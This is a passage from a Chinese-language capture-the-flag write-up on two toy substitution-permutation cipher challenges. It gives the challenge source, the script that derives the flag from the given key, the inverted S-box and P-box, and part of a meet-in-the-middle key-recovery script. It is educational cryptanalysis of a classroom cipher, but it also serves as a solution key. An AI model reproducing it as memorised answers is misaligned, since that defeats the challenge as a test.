class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">Sbox=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span> <span class="comment"># 计算了当前轮次所使用的子密钥的起始索引。</span></span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment"># 查找</span></span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = Sbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span> <span class="comment"># 置换</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[Pbox[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = round_func(X,<span class="number">1</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">3</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">4</span>,K)</span><br><span class="line"></span><br><span class="line">    kstart=<span class="number">4</span>*<span class="number">5</span> - <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] ^= K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line">K = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(K) == <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    <span class="keyword">assert</span> i == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">hash_value = sha256(long_to_bytes(list_to_int(K))).hexdigest()</span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">7</span>:-<span class="number">1</span>] == hash_value</span><br><span class="line"></span><br><span class="line">XX = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    XX[i*<span class="number">4</span>] = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(enc(XX,K))</span><br><span class="line">    XX[i*<span class="number">4</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0]</span></span><br><span class="line"><span class="comment"># [1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1]</span></span><br><span class="line"><span class="comment"># [0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1]</span></span><br><span class="line"><span class="comment"># [1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0]</span></span><br></pre></td></tr></table></figure><p>特么的K已知啊，直接跑题目得flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_list</span>(<span class="params">r, bit_len</span>):</span><br><span class="line">    <span class="built_in">list</span> = [r &gt;&gt; d &amp; <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(bit_len)][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_to_int</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">P=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">S=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span> </span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): </span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = S[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[P[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = round_func(X,<span class="number">1</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">3</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">4</span>,K)</span><br><span class="line">    kstart=<span class="number">4</span>*<span class="number">5</span> - <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] ^= K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line">K = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(K) == <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    <span class="keyword">assert</span> i == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">1</span></span><br><span class="line">hash_value = sha256(long_to_bytes(list_to_int(K))).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(hash_value)</span><br></pre></td></tr></table></figure><h3 id="0x06-babySPN-revenge"><a href="#0x06-babySPN-revenge" class="headerlink" title="0x06. babySPN_revenge"></a>0x06. babySPN_revenge</h3><p>中间相遇 yyds</p><h2 id="0x06-1-准备工作"><a href="#0x06-1-准备工作" class="headerlink" title="0x06.1 准备工作"></a>0x06.1 准备工作</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_list</span>(<span class="params">r, bit_len</span>):</span><br><span class="line">    <span class="built_in">list</span> = [r &gt;&gt; d &amp; <span class="number">1</span> <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(bit_len)][::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_to_int</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Pbox=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">Sbox=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span> <span class="comment"># 计算了当前轮次所使用的子密钥的起始索引。</span></span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment"># 查找</span></span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = Sbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span> <span class="comment"># 置换</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[Pbox[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">X,K</span>):</span><br><span class="line">    Y = round_func(X,<span class="number">1</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">2</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">3</span>,K)</span><br><span class="line">    Y = round_func(Y,<span class="number">4</span>,K)</span><br><span class="line"></span><br><span class="line">    kstart=<span class="number">4</span>*<span class="number">5</span> - <span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] ^= K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line">K = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(K) == <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">    <span class="keyword">assert</span> i == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">hash_value = sha256(long_to_bytes(list_to_int(K))).hexdigest()</span><br><span class="line"><span class="keyword">assert</span> flag[<span class="number">7</span>:-<span class="number">1</span>] == hash_value</span><br><span class="line"></span><br><span class="line">XX = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    XX[i*<span class="number">4</span>] = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(enc(XX,K))</span><br><span class="line">    XX[i*<span class="number">4</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0]</span></span><br><span class="line"><span class="comment"># [1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1]</span></span><br><span class="line"><span class="comment"># [0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1]</span></span><br><span class="line"><span class="comment"># [1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0]</span></span><br></pre></td></tr></table></figure><p>刚看到题用的是差分，因为一般类DES的考法也就差分&#x2F;线性，翻了几篇博客没懂就没往下想了，可能官方解法是差分吧。</p><p>逆s, p 盒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Pbox=[<span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">16</span>]</span><br><span class="line">rePbox = [<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>]</span><br><span class="line">Sbox=[<span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line">reSbox=[<span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure><p>逆加密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">round_func</span>(<span class="params">X,r,K</span>):</span><br><span class="line">    kstart=<span class="number">4</span>*r - <span class="number">4</span></span><br><span class="line">    XX = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        XX[i] = X[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(XX[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = Sbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        XX[<span class="number">4</span>*i],XX[<span class="number">4</span>*i+<span class="number">1</span>],XX[<span class="number">4</span>*i+<span class="number">2</span>],XX[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    Y=[<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[Pbox[i]-<span class="number">1</span>]=XX[i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_round_func4</span>(<span class="params">X,K</span>): <span class="comment"># 第四轮</span></span><br><span class="line">    Y = [<span class="number">0</span>]*<span class="number">16</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[rePbox[i]]=X[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(Y[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = reSbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        Y[<span class="number">4</span>*i],Y[<span class="number">4</span>*i+<span class="number">1</span>],Y[<span class="number">4</span>*i+<span class="number">2</span>],Y[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line">    kstart =  <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[i] = Y[i] ^ K[kstart+i]</span><br><span class="line">    <span class="keyword">return</span> Y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_round_func3</span>(<span class="params">X</span>): <span class="comment"># 前3轮</span></span><br><span class="line">    Y = [<span class="number">0</span>]*<span class="number">16</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        Y[rePbox[i]]=X[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        value = list_to_int(Y[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])</span><br><span class="line">        s_value = reSbox[value]</span><br><span class="line">        s_list = bin_to_list(s_value, <span class="number">4</span>)</span><br><span class="line">        Y[<span class="number">4</span>*i],Y[<span class="number">4</span>*i+<span class="number">1</span>],Y[<span class="number">4</span>*i+<span class="number">2</span>],Y[<span class="number">4</span>*i+<span class="number">3</span>] = s_list[<span class="number">0</span>],s_list[<span class="number">1</span>],s_list[<span class="number">2</span>],s_list[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Y</span><br></pre></td></tr></table></figure><h2 id="0x06-2-中间相遇攻击"><a href="#0x06-2-中间相遇攻击" class="headerlink" title="0x06.2 中间相遇攻击"></a>0x06.2 中间相遇攻击</h2><p>中间相遇攻击，明文 ‘0’*16 的两轮加密结果和对应的密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>] </span><br></pre></td></tr></table></figure><p>两轮解密的结果相同。把加密结果存在一个dic 里面，然后用相同的key对密文解密，在dic 里面查，如果查到的话可能就是，再用其他密文检验以下。</p><p>中间还遇到一个毛病：key只存了12 bit（因为只需要12bit ），4096个数据，如果range 设大的话就会覆盖 :( ，要再加一个循环。先构造一个key检验一下,有结果，于是开爆，花了近7h 成功出结果 :)</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202402051007987.png"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 